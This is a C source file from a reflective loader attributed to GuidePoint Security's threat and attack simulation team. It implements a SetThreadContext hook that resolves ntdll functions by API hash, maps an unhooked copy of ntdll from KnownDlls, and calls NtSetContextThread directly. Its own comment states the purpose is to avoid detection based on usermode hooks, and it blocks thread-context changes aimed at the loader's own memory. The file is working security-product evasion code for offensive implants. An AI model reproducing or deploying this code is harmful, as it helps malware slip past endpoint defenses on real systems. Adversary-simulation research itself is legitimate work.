/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef struct
{
	D_API( NtQueryInformationProcess );
	D_API( NtQueryInformationThread );
	D_API( RtlNtStatusToDosError );
	D_API( RtlSetLastWin32Error );
	D_API( NtQueryVirtualMemory );
	D_API( NtUnmapViewOfSection );
	D_API( RtlInitUnicodeString );
	D_API( NtMapViewOfSection );
	D_API( NtOpenSection );
	D_API( NtClose );
} API ;

typedef struct
{
	D_API( NtSetContextThread );
} SYS ;

#define H_API_NTQUERYINFORMATIONPROCESS	0x8cdc5dc2
#define H_API_NTQUERYINFORMATIONTHREAD	0xf5a0461b
#define H_API_RTLNTSTATUSTODOSERROR	0x39d7c890
#define H_API_RTLSETLASTWIN32ERROR	0xfd303374
#define H_API_NTQUERYVIRTUALMEMORY	0x10c0e85d
#define H_API_NTUNMAPVIEWOFSECTION	0x6aa412cd
#define H_API_RTLINITUNICODESTRING	0xef52b589
#define H_API_NTWRITEVIRTUALMEMORY	0xc3170192
#define H_API_NTMAPVIEWOFSECTION	0xd6649bca
#define H_API_NTSETCONTEXTTHREAD	0xffa0bf10
#define H_API_NTOPENSECTION		0x134eda0e
#define H_API_NTCLOSE			0x40d6e69d
#define H_LIB_NTDLL			0x1edab0ed

/*!
 *
 * Purpose:
 *
 * Maps a copy of \\KnownDlls\\ntdll and calls
 * the underlying NT call to avoid detection
 * based on usermode hooks.
 *
!*/
D_SEC( D ) BOOL WINAPI SetThreadContext_Hook( HANDLE Thread, PCONTEXT Context )
{
	API				Api;
	SYS				Sys;
	UNICODE_STRING			Uni;
	OBJECT_ATTRIBUTES		Att;
	THREAD_BASIC_INFORMATION	Tbi;
	MEMORY_BASIC_INFORMATION	Mb1;
	MEMORY_BASIC_INFORMATION	Mb2;

	SIZE_T			Len = 0;
	NTSTATUS		Nst = STATUS_UNSUCCESSFUL;
	
	HANDLE			Sec = NULL;
	PVOID			Ntm = NULL;
	PVOID			Wow = NULL;
	PVOID			Tgt = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Sys, sizeof( Sys ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );
	RtlSecureZeroMemory( &Tbi, sizeof( Tbi ) );
	RtlSecureZeroMemory( &Mb1, sizeof( Mb1 ) );
	RtlSecureZeroMemory( &Mb2, sizeof( Mb2 ) );

	Api.NtQueryInformationProcess = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYINFORMATIONPROCESS );
	Api.NtQueryInformationThread  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYINFORMATIONTHREAD );
	Api.RtlNtStatusToDosError     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLNTSTATUSTODOSERROR );
	Api.RtlSetLastWin32Error      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLSETLASTWIN32ERROR );
	Api.NtQueryVirtualMemory      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYVIRTUALMEMORY );
	Api.NtUnmapViewOfSection      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTUNMAPVIEWOFSECTION );
	Api.RtlInitUnicodeString      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.NtMapViewOfSection        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTMAPVIEWOFSECTION );
	Api.NtOpenSection             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENSECTION );
	Api.NtClose                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );


	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"\\KnownDlls\\ntdll.dll" ) ) );
	if ( NT_SUCCESS( Api.NtQueryInformationProcess( NtCurrentProcess(), ProcessWow64Information, &Wow, sizeof( Wow ), NULL ) ) ) {
		if ( Wow != NULL ) {
			Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"\\KnownDlls32\\ntdll.dll" ) ) );
		};
	};
	InitializeObjectAttributes( &Att, &Uni, OBJ_CASE_INSENSITIVE, NULL, NULL );

	if ( NT_SUCCESS( ( Nst = Api.NtOpenSection( &Sec, SECTION_MAP_EXECUTE | SECTION_MAP_READ, &Att ) ) ) ) {
		if ( NT_SUCCESS( ( Nst = Api.NtMapViewOfSection( Sec, NtCurrentProcess(), &Ntm, 0, 0, NULL, &Len, ViewUnmap, 0, PAGE_READONLY ) ) ) ) {
			Sys.NtSetContextThread = PeGetFuncEat( Ntm, H_API_NTSETCONTEXTTHREAD );
			if ( NT_SUCCESS( ( Nst = Api.NtQueryInformationThread( Thread, ThreadBasicInformation, &Tbi, sizeof( Tbi ), NULL ) ) ) ) {
				if ( U_PTR( Tbi.ClientId.UniqueProcess ) == U_PTR( NtCurrentTeb()->ClientId.UniqueProcess ) ) {

				#if defined( _WIN64 )
					Tgt = C_PTR( Context->Rip );
				#else
					Tgt = C_PTR( Context->Eip );
				#endif

					if ( NT_SUCCESS( ( Nst = Api.NtQueryVirtualMemory( NtCurrentProcess(), Tgt, MemoryBasicInformation, &Mb1, sizeof( Mb1 ), NULL ) ) ) ) {
						if ( NT_SUCCESS( ( Nst = Api.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( G_SYM( CreateThread_Hook ) ), MemoryBasicInformation, &Mb2, sizeof( Mb2 ), NULL ) ) ) ) {
							if ( U_PTR( Mb1.AllocationBase ) != U_PTR( Mb2.AllocationBase ) ) 
							{
								Nst = Sys.NtSetContextThread( Thread, Context );
							} else {
								Nst = STATUS_ACCESS_DENIED;
							};
						};
					};
				} else {
					Nst = Sys.NtSetContextThread( Thread, Context );
				};
			};
			Api.NtUnmapViewOfSection( NtCurrentProcess(), Ntm );
		};
		Api.NtClose( Sec );
	};
	Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) ); 

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Sys, sizeof( Sys ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );
	RtlSecureZeroMemory( &Tbi, sizeof( Tbi ) );
	RtlSecureZeroMemory( &Mb1, sizeof( Mb1 ) );
	RtlSecureZeroMemory( &Mb2, sizeof( Mb2 ) );

	/* Return */
	return NT_SUCCESS( Nst ) ? TRUE : FALSE;
};
